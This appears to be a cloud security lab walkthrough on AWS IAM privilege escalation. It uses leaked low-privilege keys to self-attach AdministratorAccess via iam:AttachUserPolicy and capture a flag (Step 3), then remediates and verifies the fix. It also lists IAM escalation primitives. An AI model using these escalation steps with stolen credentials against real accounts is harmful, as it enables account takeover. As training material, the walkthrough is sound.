> You have admin access to this throwaway account via the console/CloudShell — that's
> your *defender* seat. The lab also hands you a **separate, low-privileged identity**
> (leaked keys) to attack with. Everything is auto-destroyed when your session ends.

## Scenario

A CI/CD user called **`pipeline-deployer`** was meant to have a tight, limited policy.
Its access keys leaked. On paper it can barely do anything — but the policy hides a
flaw that lets it promote itself to **full administrator**. Your job: **prove the
escalation, then close it** without breaking the user's legitimate function.

You're handed the leaked keys when your lab goes live:

| Output | Use |
|---|---|
| `AttackerAccessKeyId` / `AttackerSecretAccessKey` | the leaked `pipeline-deployer` creds |
| `TargetUserName` | `pipeline-deployer` |
| `VulnerablePolicyArn` | `LabDeployerPolicy` (the policy to fix) |
| `FlagParameterName` | `/shieldsync/lab/flag` (read it once you're admin) |

## Your mission

**Prove** the escalation by capturing the admin-only flag, then **close it**: detach the admin you attached, strip the dangerous IAM-write permission from the policy, and keep the user's legitimate reads working. Verify each fix with **Check my work** (panel on the right).

<!-- ss:walkthrough -->

## Setup — become the attacker

Configure a CLI profile from the leaked keys (do this in CloudShell):

```bash
aws configure --profile attacker
#   AWS Access Key ID     -> <AttackerAccessKeyId>
#   AWS Secret Access Key -> <AttackerSecretAccessKey>
#   region                -> us-east-1

aws sts get-caller-identity --profile attacker
# -> .../user/lab/pipeline-deployer
```

## Step 1 — Recon: what can this identity do?

```bash
aws iam list-attached-user-policies --user-name pipeline-deployer --profile attacker

# Read the policy itself - find the default version, then dump it
aws iam get-policy --policy-arn <VulnerablePolicyArn> --profile attacker
aws iam get-policy-version --policy-arn <VulnerablePolicyArn> \
  --version-id v1 --profile attacker
```

Read every `Action`. The `LooksLikeANormalDeployer` statement is harmless reads —
but the **`BuildHelpers`** statement grants `iam:AttachUserPolicy` on `Resource: "*"`.

## Step 2 — Why that one line is game over

`iam:AttachUserPolicy` lets an identity attach **any** managed policy to a user —
including itself, and including AWS's `AdministratorAccess`. A "limited" user that
can call it is, in practice, an administrator.

## Step 3 — Exploit: escalate and capture the flag

```bash
# Confirm you can't read the flag yet (no ssm perms)
aws ssm get-parameter --name /shieldsync/lab/flag --profile attacker
# -> AccessDenied

# Escalate: attach AdministratorAccess to yourself
aws iam attach-user-policy --user-name pipeline-deployer \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile attacker

# You are now admin - read the flag
aws ssm get-parameter --name /shieldsync/lab/flag --profile attacker --query Parameter.Value --output text
# -> SHIELDSYNC{priv-esc-via-iam-AttachUserPolicy}
```

That flag is your proof the path is real. Now shut it.

## Step 4 — Remediate (use your admin console/CloudShell, NOT the attacker profile)
<!-- ss:obj=admin-detached,escalation-primitive-removed,deployer-still-works -->

Drop the `--profile attacker` from here on — remediate as your own admin identity.

```bash
# 1) Detach the admin you just attached
aws iam detach-user-policy --user-name pipeline-deployer \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 2) Fix the policy: create a new version WITHOUT the BuildHelpers statement,
#    and make it the default. Save the cleaned doc as fixed-policy.json first.
aws iam create-policy-version --policy-arn <VulnerablePolicyArn> \
  --policy-document file://fixed-policy.json --set-as-default
```

`fixed-policy.json` (the read statement only — escalation primitive gone):

```json
{ "Version":"2012-10-17","Statement":[
  { "Sid":"LooksLikeANormalDeployer","Effect":"Allow",
    "Action":["s3:ListAllMyBuckets","s3:GetObject","s3:ListBucket",
              "cloudwatch:GetMetricData","logs:DescribeLogGroups","logs:GetLogEvents"],
    "Resource":"*" } ]}
```

> IAM managed policies keep max 5 versions. If `create-policy-version` complains,
> delete the old non-default version with `aws iam delete-policy-version`.

## Step 5 — Verify the hole is closed

```bash
# No admin attached
aws iam list-attached-user-policies --user-name pipeline-deployer

# Prove the user can no longer escalate, but can still do its job
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::<acct>:user/lab/pipeline-deployer \
  --action-names iam:AttachUserPolicy s3:GetObject
# -> iam:AttachUserPolicy = implicitDeny,  s3:GetObject = allowed
```

## Defender's takeaway

`iam:AttachUserPolicy`, `iam:PutUserPolicy`, `iam:CreatePolicyVersion`,
`iam:SetDefaultPolicyVersion`, and `iam:PassRole` (with a compute service) are all
**privilege-escalation primitives**. Granting any of them on `Resource: "*"` quietly
makes a "limited" identity an admin. Scope IAM-write actions to specific resources,
or don't grant them at all — and use `simulate-principal-policy` in CI to catch it.

## Cleanup

Nothing to do — the entire account is automatically wiped clean when your session ends.
